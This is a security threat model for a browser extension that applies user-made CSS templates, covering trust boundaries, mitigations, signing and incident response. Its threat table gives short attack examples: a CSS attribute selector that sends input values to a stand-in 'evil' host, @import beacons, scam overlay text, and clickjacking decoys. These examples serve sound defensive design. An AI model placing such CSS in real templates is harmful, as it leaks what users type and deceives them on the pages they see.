# Security Model

Non-negotiables are summarized in `AGENTS.md`. Research background: `docs/research/security-and-legal.md` (partial).

## 1. Assets to protect

1. Users' browsing privacy (what sites/pages they visit, what's on them).
2. Integrity of the pages users see (no scams, no hidden warnings, no fake UI).
3. Users' credentials/inputs on target sites.
4. The distribution channel (catalog, signing key, CI).
5. Store standing (Chrome Web Store / AMO policy compliance).

## 2. Trust boundaries

| Component | Trusted? | Notes |
|---|---|---|
| Extension code (packaged, reviewed by store) | Trusted | Only code that runs |
| Adapters (platform-maintained data) | Trusted after review + signature | Data only; still validated by schema |
| Curated templates (ours) | Trusted after review + signature | Still go through the sanitizer |
| Community templates | **Untrusted** | Sanitized server-side and client-side; human review in Phase 2 |
| Locally imported / authored templates | **Untrusted** | Sanitized; not signed; never uploaded automatically |
| Target website | **Untrusted** | May detect, tamper with, or probe the extension |
| Catalog server / R2 | **Untrusted for integrity** | Signatures make a compromised server harmless |

## 3. Threats and mandatory mitigations

| # | Threat | Example | Mitigation (must be implemented) | Where |
|---|---|---|---|---|
| T1 | CSS data exfiltration / tracking | `input[value^="a"]{background:url(https://evil/a)}`; `@import` beacons; `@font-face` `unicode-range` leaks | **No network from template CSS** (D-014): reject `@import`, any external `url()`/`image-set()`/`src()`, `@font-face` sources other than `asset()`; reject authored `data:` URLs (assets only via `asset()`); sanitizer in **both** server/CI and extension | compiler |
| T2 | UI redress / scam overlays | `::before{content:"Call support: +1-…"}`; hiding "This video may be misleading" labels; shrinking/hiding consent or security notices; overlaying fake buttons | `content` strings > 3 chars flagged for human review; templates can't style adapter `protected` components at all: any selector using one, or a raw selector naming its elements/ids/classes, is rejected, which covers every hiding technique (D-028); the runtime pauses templates while a protected component is on the page, against ancestor hiding and overlays (T-2.9); click-through and topmost fixed overlays are flagged for review; templates never apply on adapter `sensitive` routes | compiler, adapters, review |
| T3 | Clickjacking-style tricks | `pointer-events:none` on real buttons + positioned decoys | Rules combining `pointer-events: none` with `position: fixed/absolute`, and fixed elements with `z-index` ≥ 10 000, are flagged for review (`CSS_OVERLAY`) | compiler (review flag), review |
| T4 | Performance DoS | deep `:has()` chains, `*` selectors with heavy effects, infinite animations of `filter` | Size limits, `:has()` depth ≤ 4, selector count ≤ 5,000, CI style-recalc benchmark on fixtures (warn > 50 ms) | compiler, CI |
| T5 | Supply chain: compromised server or bucket | Attacker swaps a bundle in R2 | Ed25519 signature over canonical JSON + per-asset SHA-256; public keys pinned in extension; key only in protected CI environment; rollback protection via index `issuedAt` | extension, CI |
| T6 | Compromised creator account | Malicious new version of a popular template | Every new version re-reviewed (diff view); PATCH-fast-path only if no flagged rules; revocation list (signed, checked every update cycle) | CI, review |
| T7 | Dependency compromise in the extension | Malicious npm update | Minimal deps; lockfile; pinned versions; Renovate PRs reviewed; no remote code; strict default extension CSP | repo |
| T8 | Site fingerprinting / hostile detection | LinkedIn-style probing of `web_accessible_resources` | Expose **no** web-accessible resources; no DOM nodes, attributes or page-world globals (adopted sheets add no nodes). Styling itself stays detectable (the page can list `document.adoptedStyleSheets` and read computed styles), so compiled CSS carries no template ids, names or comments (R-18) | extension |
| T9 | Message spoofing | Page sends crafted messages | Content script ignores `window.postMessage` and sends no messages at all (it only reads storage); the background accepts requests only from our own extension pages (sender id + extension-origin URL), so a compromised page or content script can't change settings; all runtime messages schema-validated; `externally_connectable` limited to our domain (M7) | extension |
| T10 | Privacy leak via telemetry | URLs in reports | No telemetry by default; opt-in reports carry only ids/versions/probe ids; never URLs, titles, DOM text; screenshots only if user attaches manually (M8+). The M3 "Looks broken?" link prefills a GitHub issue with ids, versions, failed parts, extension version and browser name only; the user reviews and submits it (D-036) | extension, api |
| T11 | Hostile template `.zip` or library file (M3 import) | Zip bomb; `../` paths; a bundle with `@import` beacons; a library file that points sites at junk | The options page's zip reader refuses traversal and hidden-path tricks, encrypted and ZIP64 archives, more than 200 files or 2 MB, and entries whose inflated size or CRC differs from the directory (checked while inflating). The background then validates the files and compiles or sanitizes every style before storing anything. Stored templates are re-validated on every load, and every compile sanitizes again (D-034). Library files are schema-validated whole; template ids, palettes and settings are checked again when used | extension |

Attack fixtures: `packages/compiler/test/attacks/*.css` (34 files covering T1–T4 as of M1), each starting with `/* expect: CODE */` or `/* expect: CODE (review) */`; `packages/compiler/test/attacks.test.ts` runs every file through the full compiler. A benign corpus (`test/benign/`) must compile with no diagnostics. **The sanitizer is done when every fixture is caught**, and any new bypass gets a fixture first.

## 4. Data inventory

| Data | Where | Leaves device? | Retention |
|---|---|---|---|
| Site assignments, settings, installed templates | `chrome.storage.local`; template choices and settings (not templates, not site access) also in `storage.sync` (D-035) | Only via the user's own browser sync | Until uninstall |
| Library export file | Wherever the user saves it | Only if the user shares it: prefs, choices, settings, imported templates; no URLs or history | User's choice |
| Compiled CSS, probe health | `chrome.storage.local` | No (M8: opt-in aggregate probe results only) | Overwritten |
| Template downloads | Worker logs (M7) | Yes: template id/version, IP in transit | Don't persist IPs; counters aggregated by day |
| Breakage reports (M8, opt-in) | D1/Analytics Engine | Yes: ids, versions, failed probe ids | 90 days |
| Accounts (M9) | D1 | Yes | Until account deletion |

Privacy policy (T-6.2) must match this table exactly; CWS "Limited Use" disclosures follow from it.

## 5. Review process (Phase 2)

1. CI validator: errors block; warnings and flags labeled on the PR.
2. Human review checklist: name/branding rules (template-schema §10), screenshots free of personal data, flagged `content` strings, protected-component checks, licensing of bundled fonts/images.
3. Merge → sign → publish. Target turnaround: 48 h.
4. Post-publish: breakage reports and abuse reports → revoke if needed (revocation reaches users within one update cycle, ≤ 6 h).

## 6. Incident response (minimal)

| Event | Action | Target time |
|---|---|---|
| Malicious template found | Add to revocations, re-sign index, notify affected users in popup | ≤ 2 h |
| Signing key suspected leaked | Ship extension update with new key set + revoke old `keyId`; re-sign catalog | ≤ 24 h (store review dependent) |
| Site redesign breaks adapter | Adapter PATCH via catalog (M7+) or extension release (MVP-1) | ≤ 72 h (Gate A), ≤ 48 h (Gate B) |
| Legal takedown (DMCA/ToS) | Revoke + delist; follow notice procedure | per policy |
